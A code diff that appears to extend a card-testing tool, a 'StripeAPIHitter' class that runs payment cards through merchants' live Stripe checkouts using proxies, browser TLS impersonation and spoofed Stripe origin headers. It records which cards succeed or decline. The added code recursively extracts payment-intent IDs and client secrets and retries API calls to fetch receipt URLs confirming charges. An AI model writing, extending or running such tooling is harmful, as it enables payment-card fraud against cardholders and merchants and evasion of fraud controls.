@@ -572,6 +572,40 @@ def find_receipt_url(d):
                 return res
     return None
 
+def extract_intent_details(d):
+    intent_id = None
+    client_secret = None
+    
+    if isinstance(d, dict):
+        for key in ['payment_intent', 'setup_intent']:
+            val = d.get(key)
+            if isinstance(val, dict):
+                intent_id = val.get('id')
+                client_secret = val.get('client_secret')
+                if intent_id and client_secret:
+                    return intent_id, client_secret
+            elif isinstance(val, str) and (val.startswith('pi_') or val.startswith('seti_')):
+                intent_id = val
+        
+        intent_id = d.get('id') or intent_id
+        client_secret = d.get('client_secret') or client_secret
+        if intent_id and client_secret:
+            return intent_id, client_secret
+            
+        for v in d.values():
+            if isinstance(v, (dict, list)):
+                i_id, c_sec = extract_intent_details(v)
+                if i_id and c_sec:
+                    return i_id, c_sec
+                    
+    elif isinstance(d, list):
+        for item in d:
+            i_id, c_sec = extract_intent_details(item)
+            if i_id and c_sec:
+                return i_id, c_sec
+                
+    return intent_id, client_secret
+
 class StripeAPIHitter:
     def __init__(self, pk_live: str, cs_live: str, proxy_data: Dict, raw_amount: int = None, locked_email: str = None):
         self.pk_live = pk_live
@@ -580,6 +614,34 @@ class StripeAPIHitter:
         self.raw_amount = raw_amount
         self.locked_email = locked_email
         
+    async def fetch_receipt_url(self, intent_id: str, client_secret: str, headers: dict, proxies: dict, profile: dict) -> Optional[str]:
+        if not intent_id or not client_secret:
+            return None
+        if intent_id.startswith('seti_'):
+            return None
+            
+        loop = asyncio.get_event_loop()
+        url = f"https://api.stripe.com/v1/payment_intents/{intent_id}?is_stripe_sdk=false&client_secret={client_secret}&key={self.pk_live}"
+        get_headers = {
+            "accept": "application/json",
+            "origin": "https://js.stripe.com",
+            "referer": "https://js.stripe.com/",
+            "user-agent": headers.get("user-agent", "")
+        }
+        
+        for attempt in range(3):
+            try:
+                res = await loop.run_in_executor(None, lambda: cffi_requests.get(url, headers=get_headers, proxies=proxies, timeout=10, impersonate=profile["impersonate"]))
+                if res.status_code == 200:
+                    res_json = res.json()
+                    receipt_url = find_receipt_url(res_json)
+                    if receipt_url:
+                        return receipt_url
+            except Exception as e:
+                print(f"DEBUG: fetch_receipt_url attempt {attempt+1} failed: {e}")
+            await asyncio.sleep(0.5)
+        return None
+
     async def hit(self, card: Dict, attempt: int, user_id: int) -> Dict:
         start = time.time()
         result = {'attempt': attempt, 'card': card, 'success': False, 'decline_code': None, 'response_time': 0, 'amount': None, 'merchant': None, 'proxy_raw': None, 'error': None}
@@ -755,6 +817,10 @@ class StripeAPIHitter:
                     si = confirm_json.get('setup_intent', {})
                     intent_id = pi.get('id') if isinstance(pi, dict) and pi.get('id') else (si.get('id') if isinstance(si, dict) else None)
                     client_secret = pi.get('client_secret') if isinstance(pi, dict) and pi.get('client_secret') else (si.get('client_secret') if isinstance(si, dict) else None)
+                    if not intent_id or not client_secret:
+                        fallback_id, fallback_secret = extract_intent_details(confirm_json)
+                        intent_id = intent_id or fallback_id
+                        client_secret = client_secret or fallback_secret
                     is_setup_intent = bool(si) or (isinstance(intent_id, str) and 'seti' in intent_id)
                     
                     if isinstance(pi, dict) and pi.get('last_payment_error'):
@@ -781,6 +847,8 @@ class StripeAPIHitter:
                     if status in ['succeeded', 'requires_capture', 'complete']:
                         result['success'] = True
                         receipt_url = find_receipt_url(confirm_json)
+                        if not receipt_url and intent_id and client_secret:
+                            receipt_url = await self.fetch_receipt_url(intent_id, client_secret, headers, proxies, profile)
                         if receipt_url:
                             result['receipt_url'] = receipt_url
                         return result
@@ -900,6 +968,8 @@ class StripeAPIHitter:
                                 if status_2 in ['succeeded', 'requires_capture', 'complete']:
                                     result['success'] = True
                                     receipt_url = find_receipt_url(poll_json)
+                                    if not receipt_url and pi and client_secret:
+                                        receipt_url = await self.fetch_receipt_url(pi, client_secret, headers, proxies, profile)
                                     if receipt_url:
                                         result['receipt_url'] = receipt_url
                                 else:
@@ -919,6 +989,8 @@ class StripeAPIHitter:
                                                 result['success'] = True
                                                 result['final_url'] = return_url or redirect_url
                                                 receipt_url = find_receipt_url(poll_json_3)
+                                                if not receipt_url and pi and client_secret:
+                                                    receipt_url = await self.fetch_receipt_url(pi, client_secret, headers, proxies, profile)
                                                 if receipt_url:
                                                     result['receipt_url'] = receipt_url
                                                 return result
@@ -953,6 +1025,8 @@ class StripeAPIHitter:
                                         result['success'] = True
                                         result['final_url'] = return_url or redirect_url
                                         receipt_url = find_receipt_url(poll_json)
+                                        if not receipt_url and pi and client_secret:
+                                            receipt_url = await self.fetch_receipt_url(pi, client_secret, headers, proxies, profile)
                                         if receipt_url:
                                             result['receipt_url'] = receipt_url
                                         return result
